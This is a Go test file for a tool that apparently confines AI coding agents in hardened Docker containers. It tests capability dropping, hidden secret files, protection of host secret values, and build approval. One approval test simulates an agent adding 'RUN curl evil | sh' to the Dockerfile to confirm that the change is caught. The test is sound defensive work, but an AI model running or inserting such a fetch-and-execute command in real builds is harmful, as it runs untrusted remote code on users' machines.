// SPDX-License-Identifier: GPL-3.0-only

package jail

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/schorsch3000/aicatraz/internal/approve"
	"github.com/schorsch3000/aicatraz/internal/config"
	"github.com/schorsch3000/aicatraz/internal/pins"
)

func testInput(t *testing.T, yaml string) RunInput {
	t.Helper()
	cfg, ps := config.Parse([]byte(yaml), config.Options{Home: "/home/u"})
	if config.HasErrors(ps) {
		t.Fatalf("config: %+v", ps)
	}
	return RunInput{
		Cfg: cfg, ID: "proj-1", Name: "aicatraz-proj-1-9", Image: "debian:stable-slim",
		UID: 1000, GID: 1001, UserName: "u", Home: "/home/u", Cwd: "/home/u/p",
		HostBinary: "/opt/aicatraz", StateDir: "/state/proj-1",
		HideIsDir: map[string]bool{"/home/u/p/.env": false, "/home/u/p/secrets": true},
	}
}

// has reports whether args contains the consecutive elements seq.
func has(args []string, seq ...string) bool {
	for i := 0; i+len(seq) <= len(args); i++ {
		if slices.Equal(args[i:i+len(seq)], seq) {
			return true
		}
	}
	return false
}

func TestRunArgsHardening(t *testing.T) {
	args, err := RunArgs(testInput(t, "volumes:\n  - ~/p:rw\n"))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range [][]string{
		{"--cap-drop=ALL"},
		{"--security-opt=no-new-privileges"},
		{"--read-only"},
		{"--user", "1000:1001"},
		{"--pids-limit", "1024"},
		{"--init"},
		{"-e", "HOME=/home/u"},
		{"-w", "/home/u/p"},
		{"--entrypoint", "", "debian:stable-slim"},
		{"--mount", "type=bind,source=/opt/aicatraz,target=/aicatraz/aicatraz,readonly"},
		{"--mount", "type=bind,source=/state/proj-1/passwd,target=/etc/passwd,readonly"},
		{"--mount", "type=bind,source=/state/proj-1/bin,target=/aicatraz/bin,readonly"},
	} {
		if !has(args, want...) {
			t.Errorf("missing %v in\n%s", want, strings.Join(args, " "))
		}
	}
	if has(args, "-t") {
		t.Error("no -t without a terminal")
	}
	if slices.Contains(args, "--privileged") {
		t.Error("must never be privileged")
	}
	// /tmp, /var/tmp and home are volumes, not RAM.
	for _, dst := range []string{"/tmp", "/var/tmp", "/home/u"} {
		if !slices.Contains(args, "type=volume,src=aicatraz-proj-1-9-"+map[string]string{"/tmp": "tmp", "/var/tmp": "vartmp", "/home/u": "home"}[dst]+",dst="+dst+",volume-nocopy") {
			t.Errorf("no scratch volume for %s in\n%s", dst, strings.Join(args, " "))
		}
	}
	for i, a := range args {
		if a == "--tmpfs" && !strings.HasPrefix(args[i+1], "/run:") && !strings.Contains(args[i+1], "size=4k") && !strings.Contains(args[i+1], "ro,") {
			t.Errorf("unexpected RAM-backed mount %s", args[i+1])
		}
	}
}

func TestRunArgsVolumes(t *testing.T) {
	args, err := RunArgs(testInput(t, `
volumes:
  - ~/p/.env:hi
  - ~/p/secrets:hi
  - ~/p/Makefile:ro
  - ~/p:rw
`))
	if err != nil {
		t.Fatal(err)
	}
	line := strings.Join(args, " ")
	for _, want := range []string{
		"--mount type=bind,source=/home/u/p,target=/home/u/p ",
		"--mount type=bind,source=/home/u/p/Makefile,target=/home/u/p/Makefile,readonly",
		"--mount type=bind,source=/dev/null,target=/home/u/p/.env,readonly",
		"--tmpfs /home/u/p/secrets:ro,",
	} {
		if !strings.Contains(line, want) {
			t.Errorf("missing %q", want)
		}
	}
	// Parents are mounted before the entries nested in them.
	if strings.Index(line, "target=/home/u/p ") > strings.Index(line, "target=/home/u/p/.env") {
		t.Error("rw parent must come before the hidden file")
	}
}

// The deepest entry decides, so the order of the volumes in the file is
// irrelevant: every ordering gives the same mounts.
func TestVolumeOrderDoesNotMatter(t *testing.T) {
	entries := []string{
		"~/p:rw",
		"~/p/sub:ro",
		"~/p/sub/deep:rw",
		"~/p/.env:hi",
		"~/p/secrets:hi",
	}
	mounts := func(order []string) string {
		yaml := "volumes:\n"
		for _, e := range order {
			yaml += "  - " + e + "\n"
		}
		in := testInput(t, yaml)
		in.HideIsDir = map[string]bool{"/home/u/p/.env": false, "/home/u/p/secrets": true}
		args, err := volumeArgs(in.Cfg.Resolved, in.HideIsDir)
		if err != nil {
			t.Fatal(err)
		}
		return strings.Join(args, "\n")
	}
	want := mounts(entries)
	// Every rotation and the reverse of each.
	for i := range entries {
		rot := append(slices.Clone(entries[i:]), entries[:i]...)
		if got := mounts(rot); got != want {
			t.Errorf("order %v changed the mounts:\n%s\nvs\n%s", rot, got, want)
		}
		slices.Reverse(rot)
		if got := mounts(rot); got != want {
			t.Errorf("order %v changed the mounts:\n%s\nvs\n%s", rot, got, want)
		}
	}
	// A parent is always mounted before what is nested in it.
	last := -1
	for _, target := range []string{"source=/home/u/p,", "source=/home/u/p/sub,", "source=/home/u/p/sub/deep,"} {
		i := strings.Index(want, target)
		if i < 0 || i < last {
			t.Fatalf("%q missing or out of order in:\n%s", target, want)
		}
		last = i
	}
}

func TestRunArgsEnvNeverLeaksHostValues(t *testing.T) {
	t.Setenv("MY_TOKEN", "hunter2")
	in := testInput(t, "env:\n  static: {EDITOR: vim}\n  from_host: [MY_TOKEN]\nlimits: {memory: 2g, pids: 64}\n")
	in.TTY = true
	args, err := RunArgs(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.Join(args, " "), "hunter2") {
		t.Fatal("host secret value appears in the docker arguments")
	}
	for _, want := range [][]string{{"-e", "MY_TOKEN"}, {"-e", "EDITOR=vim"}, {"-e", "TERM"}, {"--memory", "2g"}, {"--pids-limit", "64"}, {"-t"}} {
		if !has(args, want...) {
			t.Errorf("missing %v", want)
		}
	}
}

func TestRunArgsCommand(t *testing.T) {
	in := testInput(t, "")
	in.Command = []string{"make", "build"}
	args, _ := RunArgs(in)
	if !has(args, "debian:stable-slim", "make", "build") {
		t.Errorf("command not appended: %v", args)
	}
	in.Command = nil
	args, _ = RunArgs(in)
	if !has(args, "debian:stable-slim", "/bin/sh", "-c") {
		t.Errorf("default shell missing: %v", args)
	}
}

func TestRunArgsUninspectedHide(t *testing.T) {
	in := testInput(t, "volumes:\n  - ~/p:rw\n  - ~/p/x:hi\n")
	if _, err := RunArgs(in); err == nil {
		t.Error("hidden path that was never inspected must be an error")
	}
}

func TestPickCwd(t *testing.T) {
	cfg, _ := config.Parse([]byte("volumes:\n  - ~/p:rw\n  - ~/p/.env:hi\n  - ~/tools:ro\n"), config.Options{Home: "/home/u"})
	v := cfg.Resolved
	for _, tc := range []struct{ cwd, want string }{
		{"/home/u/p", "/home/u/p"},
		{"/home/u/p/sub", "/home/u/p/sub"},
		{"/home/u/tools", "/home/u/tools"},
		{"/home/u/p/.env", "/home/u/p"}, // hidden: not a useful cwd
		{"/elsewhere", "/home/u/p"},     // first rw volume
	} {
		if got := PickCwd(v, tc.cwd, "/home/u"); got != tc.want {
			t.Errorf("cwd %s: got %s, want %s", tc.cwd, got, tc.want)
		}
	}
	if got := PickCwd(nil, "/x", "/home/u"); got != "/home/u" {
		t.Errorf("no volumes: got %s", got)
	}
}

func TestMergePasswd(t *testing.T) {
	base := "root:x:0:0:root:/root:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
	got := MergePasswd(base, 1000, 1000, "heilig", "/home/heilig")
	if !strings.HasSuffix(got, "heilig:x:1000:1000:heilig:/home/heilig:/bin/sh\n") || !strings.HasPrefix(got, base) {
		t.Errorf("entry not appended:\n%s", got)
	}
	if MergePasswd(got, 1000, 1000, "heilig", "/home/heilig") != got {
		t.Error("merge must be idempotent")
	}
	if got := MergePasswd(base, 0, 0, "x", "/y"); got != base {
		t.Error("existing uid must be left alone")
	}
	if got := MergePasswd(base, 1000, 1000, "root", "/h"); !strings.Contains(got, "\naicatraz:x:1000:") {
		t.Errorf("name clash must fall back: %s", got)
	}
	if got := MergePasswd("", 5, 5, "a", "/h"); got != "a:x:5:5:a:/h:/bin/sh\n" {
		t.Errorf("empty base: %q", got)
	}
	if got := MergePasswd("root:x:0:0::/root:/bin/sh", 5, 5, "a", "/h"); !strings.Contains(got, "/bin/sh\na:x:5") {
		t.Errorf("missing trailing newline not handled: %q", got)
	}
}

func TestMergeGroup(t *testing.T) {
	base := "root:x:0:\nstaff:x:50:\n"
	if got := MergeGroup(base, 1000, "heilig"); got != base+"heilig:x:1000:\n" {
		t.Errorf("got %q", got)
	}
	if got := MergeGroup(base, 50, "heilig"); got != base {
		t.Error("existing gid must be left alone")
	}
}

func TestResolveImage(t *testing.T) {
	dir := t.TempDir()
	parse := func(y string) *config.Config {
		c, ps := config.Parse([]byte(y), config.Options{Home: "/home/u"})
		if config.HasErrors(ps) {
			t.Fatal(ps)
		}
		return c
	}

	img, err := ResolveImage(parse(""), dir, "p")
	if err != nil || img.Build != nil || img.Ref != defaultBaseImage {
		t.Errorf("default: %+v %v", img, err)
	}
	img, _ = ResolveImage(parse("image: alpine:3\n"), dir, "p")
	if img.Ref != "alpine:3" || img.Build != nil {
		t.Errorf("ref: %+v", img)
	}

	if _, err := ResolveImage(parse("image: {dockerfile: Nope}\n"), dir, "p"); err == nil {
		t.Error("missing Dockerfile must be an error")
	}

	// Dockerfile.az next to the config is picked up without any config.
	if err := os.WriteFile(filepath.Join(dir, "Dockerfile.az"), []byte("FROM debian:stable-slim\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	img, err = ResolveImage(parse(""), dir, "p")
	if err != nil || img.Build == nil || img.Ref != "aicatraz/p:latest" ||
		img.Build.Dockerfile != filepath.Join(dir, "Dockerfile.az") || img.Build.Context != dir {
		t.Errorf("default Dockerfile.az: %+v %v", img, err)
	}
	// ...but an explicit reference wins.
	if img, _ = ResolveImage(parse("image: alpine:3\n"), dir, "p"); img.Build != nil {
		t.Error("explicit ref must not build")
	}
}

func TestBuildArgs(t *testing.T) {
	got := Build{Dockerfile: "/p/Dockerfile.az", Context: "/p"}.Args("aicatraz/x:latest")
	want := []string{"build", "-f", "/p/Dockerfile.az", "-t", "aicatraz/x:latest", "/p"}
	if !slices.Equal(got, want) {
		t.Errorf("got %v", got)
	}
}

func TestProjectID(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "My Project")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	cfgPath := filepath.Join(dir, "aicatraz.yaml")
	if err := os.WriteFile(cfgPath, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{}
	id, err := ProjectID(cfgPath, cfg)
	if err != nil || !strings.HasPrefix(id, "my-project-") || len(id) != len("my-project-")+8 {
		t.Errorf("id %q err %v", id, err)
	}
	if id2, _ := ProjectID(cfgPath, cfg); id2 != id {
		t.Error("id must be stable")
	}
	link := filepath.Join(t.TempDir(), "link.yaml")
	if err := os.Symlink(cfgPath, link); err != nil {
		t.Fatal(err)
	}
	if id3, _ := ProjectID(link, cfg); id3 != id {
		t.Errorf("symlinked config must give the same id: %q vs %q", id3, id)
	}
	cfg.Project.ID = "Fixed_ID"
	if id4, _ := ProjectID(cfgPath, cfg); id4 != "fixed_id" {
		t.Errorf("explicit id: %q", id4)
	}
}

func TestShims(t *testing.T) {
	rules := []config.Rule{{Command: "make"}, {Command: "git"}, {Command: "make"}, {Command: "*"}, {Command: "py*"}}
	got := ShimCommands(rules)
	if !slices.Equal(got, []string{"make", "git"}) {
		t.Errorf("commands: %v", got)
	}
	dir := filepath.Join(t.TempDir(), "bin")
	for i := 0; i < 2; i++ { // second run must replace, not fail
		if err := WriteShimDir(dir, got); err != nil {
			t.Fatal(err)
		}
	}
	target, err := os.Readlink(filepath.Join(dir, "make"))
	if err != nil || target != ContainerBinary {
		t.Errorf("link: %q %v", target, err)
	}
	if err := WriteShimDir(dir, nil); err != nil {
		t.Fatal(err)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Error("stale shims must be removed")
	}
}

func TestShellQuote(t *testing.T) {
	if got := shellQuote("a b"); got != "'a b'" {
		t.Error(got)
	}
	if got := shellQuote(""); got != "''" {
		t.Error(got)
	}
	if got := shellQuote("it's"); got != `'it'\''s'` {
		t.Error(got)
	}
	if got := shellQuote("plain-1.2/x"); got != "plain-1.2/x" {
		t.Error(got)
	}
}

func TestRunBase(t *testing.T) {
	rt := t.TempDir()
	t.Setenv("XDG_RUNTIME_DIR", rt)
	base, err := RunBase()
	if err != nil || base != filepath.Join(rt, "aicatraz") {
		t.Fatalf("%q %v", base, err)
	}
	if st, _ := os.Stat(base); st.Mode().Perm() != 0o700 {
		t.Errorf("mode %v", st.Mode().Perm())
	}
	if err := os.Chmod(base, 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := RunBase(); err == nil {
		t.Error("a directory others can enter must be refused")
	}
	// Without a runtime dir it falls back to a per-user directory under /tmp.
	t.Setenv("XDG_RUNTIME_DIR", "")
	t.Setenv("TMPDIR", t.TempDir())
	if base, err := RunBase(); err != nil || !strings.Contains(base, "aicatraz-") {
		t.Errorf("fallback: %q %v", base, err)
	}
}

func TestRunArgsProxyWiring(t *testing.T) {
	in := testInput(t, "env:\n  static: {PATH: /opt/x/bin}\n")
	in.SocketPath = "/run/user/1000/aicatraz/7/broker.sock"
	in.ImagePath = "/usr/local/bin:/usr/bin"
	args, _ := RunArgs(in)
	if !has(args, "--mount", "type=bind,source=/run/user/1000/aicatraz/7/broker.sock,target=/aicatraz/broker.sock,readonly") {
		t.Error("socket must be mounted read-only")
	}
	if !has(args, "-e", "PATH=/aicatraz/bin:/opt/x/bin") {
		t.Errorf("the shim dir must come first and a configured PATH must win: %v", args)
	}
	in = testInput(t, "")
	in.ImagePath = "/usr/local/bin:/usr/bin"
	args, _ = RunArgs(in)
	if !has(args, "-e", "PATH=/aicatraz/bin:/usr/local/bin:/usr/bin") {
		t.Errorf("image PATH must be kept: %v", args)
	}
	in.ImagePath = ""
	args, _ = RunArgs(in)
	if !has(args, "-e", "PATH=/aicatraz/bin:"+fallbackPath) {
		t.Errorf("fallback PATH: %v", args)
	}
}

func TestIsTerminal(t *testing.T) {
	null, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer null.Close()
	if isTerminal(null) {
		t.Error("/dev/null is a character device but not a terminal")
	}
	r, w, _ := os.Pipe()
	defer r.Close()
	defer w.Close()
	if isTerminal(r) {
		t.Error("a pipe is not a terminal")
	}
}

func TestCopySources(t *testing.T) {
	df := `
FROM debian
COPY package.json package-lock.json ./
COPY --chown=1000:1000 conf/app.conf /etc/app.conf
COPY --from=builder /out/bin /usr/bin/
COPY src/ /app/src/
COPY . /app
COPY *.txt /tmp/
ADD https://example.com/x.tgz /tmp/
ADD ["with space.cfg", "other.cfg", "/etc/"]
COPY a.txt \
     b.txt /dest/
COPY $FILE /x
COPY /abs/file /x
RUN echo COPY not-an-instruction.txt /x
`
	got := copySources(df)
	want := []string{"package.json", "package-lock.json", "conf/app.conf", "src", ".", "with space.cfg", "other.cfg", "a.txt", "b.txt"}
	if !slices.Equal(got, want) {
		t.Errorf("got  %q\nwant %q", got, want)
	}
}

func TestBuildFiles(t *testing.T) {
	ctx := t.TempDir()
	write := func(rel, c string) {
		os.MkdirAll(filepath.Dir(filepath.Join(ctx, rel)), 0o755)
		os.WriteFile(filepath.Join(ctx, rel), []byte(c), 0o644)
	}
	write("Dockerfile.az", "FROM debian\nCOPY app.conf /etc/\nCOPY src /app\nCOPY ../outside /x\n")
	write("app.conf", "x")
	write("src/main.go", "package main")
	write("Dockerfile.az.dockerignore", ".env\n")
	write("outside", "x")
	b := Build{Dockerfile: filepath.Join(ctx, "Dockerfile.az"), Context: ctx}
	var rel []string
	for _, f := range BuildFiles(b) {
		r, _ := filepath.Rel(ctx, f)
		rel = append(rel, r)
	}
	// The Dockerfile, the ignore file and the single COPY'd file; not the copied directory.
	if !slices.Equal(rel, []string{"Dockerfile.az", "Dockerfile.az.dockerignore", "app.conf"}) {
		t.Errorf("%v", rel)
	}
}

func TestApproveBuild(t *testing.T) {
	ctx := t.TempDir()
	df := filepath.Join(ctx, "Dockerfile.az")
	os.WriteFile(df, []byte("FROM debian\n"), 0o644)
	b := Build{Dockerfile: df, Context: ctx}
	store, err := pins.Open(filepath.Join(t.TempDir(), "pins"))
	if err != nil {
		t.Fatal(err)
	}

	answer := func(a approve.Answer) (func(approve.Request) (approve.Answer, error), *approve.Request) {
		var seen approve.Request
		return func(r approve.Request) (approve.Answer, error) { seen = r; return a, nil }, &seen
	}

	// First build: never approved. No terminal, no flag: refused with a hint.
	if err := ApproveBuild(store, b, false, nil); err == nil || !strings.Contains(err.Error(), "--approve-build") {
		t.Fatalf("non-interactive: %v", err)
	}
	// Denied at the prompt.
	p, seen := answer(approve.Deny)
	if err := ApproveBuild(store, b, false, p); err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("denied: %v", err)
	}
	if seen.Kind != approve.KindBuild || len(seen.Files) != 1 || !strings.Contains(seen.Files[0].Diff, "+FROM debian") {
		t.Errorf("prompt: %+v", seen)
	}
	// Approve once: builds, but nothing is remembered.
	p, _ = answer(approve.AllowOnce)
	if err := ApproveBuild(store, b, false, p); err != nil {
		t.Fatal(err)
	}
	if err := ApproveBuild(store, b, false, nil); err == nil {
		t.Error("run-once must not pin")
	}
	// Approve and pin: quiet afterwards.
	p, _ = answer(approve.AllowPin)
	if err := ApproveBuild(store, b, false, p); err != nil {
		t.Fatal(err)
	}
	if err := ApproveBuild(store, b, false, nil); err != nil {
		t.Errorf("pinned build must pass silently: %v", err)
	}
	// The agent edits the Dockerfile: back to asking, with the diff.
	os.WriteFile(df, []byte("FROM debian\nRUN curl evil | sh\n"), 0o644)
	p, seen = answer(approve.Deny)
	if err := ApproveBuild(store, b, false, p); err == nil {
		t.Fatal("changed Dockerfile must not build unasked")
	}
	if len(seen.Files) != 1 || !strings.Contains(seen.Files[0].Diff, "+RUN curl evil | sh") {
		t.Errorf("diff: %+v", seen.Files)
	}
	// --approve-build pins without asking.
	if err := ApproveBuild(store, b, true, nil); err != nil {
		t.Fatal(err)
	}
	if err := ApproveBuild(store, b, false, nil); err != nil {
		t.Errorf("after --approve-build: %v", err)
	}
}

func TestWithNotify(t *testing.T) {
	on := config.Notifications{Shim: true}
	if got := WithNotify([]string{"make"}, on); len(got) != 2 || got[1] != NotifyCommand {
		t.Errorf("got %v", got)
	}
	if got := WithNotify([]string{NotifyCommand}, on); len(got) != 1 {
		t.Errorf("a rule's own shim is not doubled: %v", got)
	}
	if got := WithNotify([]string{"make"}, config.Notifications{}); len(got) != 1 {
		t.Errorf("off adds nothing: %v", got)
	}
}
